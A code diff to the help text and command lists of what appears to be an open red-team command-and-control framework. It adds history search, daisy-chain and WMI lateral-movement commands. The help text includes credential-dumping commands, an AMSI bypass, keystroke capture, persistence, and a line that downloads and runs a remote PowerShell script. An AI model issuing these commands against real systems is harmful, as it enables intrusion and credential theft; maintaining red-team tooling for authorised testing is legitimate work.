@@ -92,6 +92,7 @@ hide-implant
 unhide-implant
 help
 searchhelp listmodules
+searchhistory invoke-mimikatz
 label-implant <newlabel>
 remove-label
 bypass-amsi
@@ -171,6 +172,13 @@ dcomexec -t 10.0.0.1 -m shellbrowserwindow -c c:\\windows\\system32\\cmd.exe -a 
 dcomexec -t 10.0.0.1 -m shellwindows -c c:\\windows\\system32\\cmd.exe -a "/c notepad.exe"
 sharpsc SERVER01 service "cmd /c rundll32.exe test.dll,Ep" domain username password
 
+Lateral Movement with Pre-Built Payload:
+=========================================
+sharpwmi action=executejs computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123!
+sharpwmi action=executevbs computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123!
+startdaisy
+stopdaisy
+
 Socks:
 ======
 sharpsocks
@@ -194,6 +202,7 @@ Implant Features:
 =====================
 ps
 searchhelp mimikatz
+searchhistory invoke-mimikatz
 label-implant <newlabel>
 remove-label
 get-hash
@@ -226,7 +235,8 @@ invoke-hostenum -all
 find-allvulns
 invoke-expression (get-webclient).downloadstring("https://module.ps1")
 startanotherimplant or sai
-invoke-daisychain -daisyserver http://192.168.1.1 -port 80 -c2port 80 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\\test -proxypassword pass -localhost (optional if low level user)
+startdaisy
+invoke-daisychain -daisyserver http://192.168.1.1 -port 8899 -c2port 443 -c2server https://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\\test -proxypassword pass -localhost (optional if low level user)
 createproxypayload -user <dom\\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>
 get-mshotfixes
 get-firewallrulesall | out-string -width 200
@@ -448,7 +458,8 @@ Invoke-EDRChecker -Remote <hostname> -Ignore
 
 Implant Handler:
 =====================
-searchhelp
+searchhelp payload
+searchhistory pushover
 back
 quit
 exit
@@ -502,7 +513,7 @@ posh_help = posh_help1 + posh_help2 + posh_help3 + posh_help4 + posh_help5 + pos
 
 # pre help commands
 PRECOMMANDS = ['list-urls', 'show-urls', 'add-autorun', 'list-autorun', 'del-autorun', 'nuke-autorun', 'automigrate-frompowershell',
-               'show-serverinfo', 'history', 'generate-reports', 'set-clockworksmsapikey', 'set-clockworksmsnumber', 'set-defaultbeacon',
+               'show-serverinfo', 'history', 'generate-reports', 'set-pushover-applicationtoken', 'set-pushover-userkeys', 'set-defaultbeacon',
                'listmodules', 'pwnself', 'creds', 'createnewpayload', 'createproxypayload', 'listmodules', "set-killdate",
                'createdaisypayload', 'turnoff-notifications', 'turnon-notifications', 'tasks', 'cleartasks', "opsec", "message"]
 
@@ -519,7 +530,7 @@ COMMANDS = ['loadmodule', "invoke-bloodhound", "brute-ad", "brute-locadmin",
             "get-netuser", "sleep", "beacon", "setbeacon", "get-screenshot", "install-persistence", "hide-implant", "unhide-implant", "kill-implant", "invoke-runasdaisypayload",
             "invoke-runasproxypayload", "invoke-runaspayload", "migrate", "$psversiontable", "back", "clear", "invoke-daisychain", "stopdaisy",
             "ipconfig", "upload-file", "download-file", "download-files", "history", "get-help", "stopsocks", "get-screenshotallwindows",
-            "hashdump", "cred-popper", "help", "whoami", "get-proxy", "restart-computer",
+            "hashdump", "cred-popper", "help", "whoami", "get-proxy", "restart-computer", "startdaisy",
             "turtle", "posh-delete", "get-idletime", "get-psdrive", "get-netcomputer", "get-netdomain", "get-netforest", "get-netforesttrust",
             "get-forestdomain", "test-connection", "get-netdomaincontroller", "invoke-pbind", "pbind-command", "invoke-kerberoast", "invoke-userhunter",
             "get-process", "start-process", "searchhelp", "get-netshare", "pbind-kill", "pbind-loadmodule", "install-servicelevel-persistencewithproxy",
@@ -530,12 +541,13 @@ COMMANDS = ['loadmodule', "invoke-bloodhound", "brute-ad", "brute-locadmin",
             "invoke-wmievent", "remove-wmievent", "get-wmievent", "invoke-smbclient", "get-keystrokedata", "unhidefile", "hidefile", "remove-label", "label-implant",
             'invoke-psexecpayload', 'invoke-wmijsproxypayload', 'invoke-wmijspayload', 'invoke-wmipayload', 'invoke-dcompayload', 'invoke-psexecproxypayload', 'invoke-wmiproxypayload',
             "get-ipconfig", 'invoke-dcomproxypayload', 'invoke-psexecdaisypayload', 'invoke-wmijsdaisypayload',
-            'invoke-wmidaisypayload', 'invoke-dcomdaisypayload', 'invoke-wmijspbindpayload', 'get-lapspasswords', "get-inveigh", "runas-netonly", "invoke-edrchecker"]
+            'invoke-wmidaisypayload', 'invoke-dcomdaisypayload', 'invoke-wmijspbindpayload', 'get-lapspasswords', "get-inveigh", "runas-netonly", "invoke-edrchecker",
+            "searchhistory"]
 
 # post help commands python implant
 UXCOMMANDS = ["label-implant", "remove-label", "unhide-implant", "hide-implant", "help", "searchhelp", "python", "loadmodule",
               "loadmoduleforce", "get-keystrokes", "back", "upload-file", "download-file", "install-persistence", "remove-persistence", "sai",
-              "startanotherimplant-keepfile", "get-screenshot", "startanotherimplant", "pwd", "id", "ps", "setbeacon", "kill-implant", "linuxprivchecker", "quit"]
+              "startanotherimplant-keepfile", "get-screenshot", "startanotherimplant", "pwd", "id", "ps", "setbeacon", "kill-implant", "linuxprivchecker", "quit", "searchhistory"]
 
 # post help commands sharp implant
 SHARPCOMMANDS = ["get-userinfo", "get-idletime", "stop-keystrokes", "start-keystrokes", "start-keystrokes-writefile", "get-keystrokes", "delete", "move", "label-implant", "remove-label", "upload-file", "quit",
@@ -544,4 +556,6 @@ SHARPCOMMANDS = ["get-userinfo", "get-idletime", "stop-keystrokes", "start-keyst
                  "inject-shellcode", "start-process", "run-exe", "run-dll", "hide-implant", "help", "searchhelp", "listmodules", "loadmodule",
                  "loadmoduleforce", "back", "ps", "beacon", "setbeacon", "kill-implant", "get-screenshotmulti", "safetydump", "seatbelt", "sharpup",
                  "sharphound", "rubeus", "sharpview", "kill-process", "watson", "get-hash", "migrate", "sharpsocks", "safetykatz", "get-computerinfo",
-                 "get-dodgyprocesses", "sharpweb", "bypass-amsi", "sharpsc", "dcomexec", "smbexec", "wmiexec", "sharpwmi", "sharpcookiemonster"]
+                 "get-dodgyprocesses", "sharpweb", "bypass-amsi", "sharpsc", "dcomexec", "smbexec", "wmiexec", "sharpwmi", "sharpcookiemonster", "stop-screenshotmulti",
+                 "get-screenshotallwindows", "del", "kill-process", "posh-delete", "getremoteprocesslisting", "getremoteprocesslistingall", "sslinspectioncheck",
+                 "dynamic-code", "startdaisy", "mimikatz", "searchhistory", "stopdaisy"]
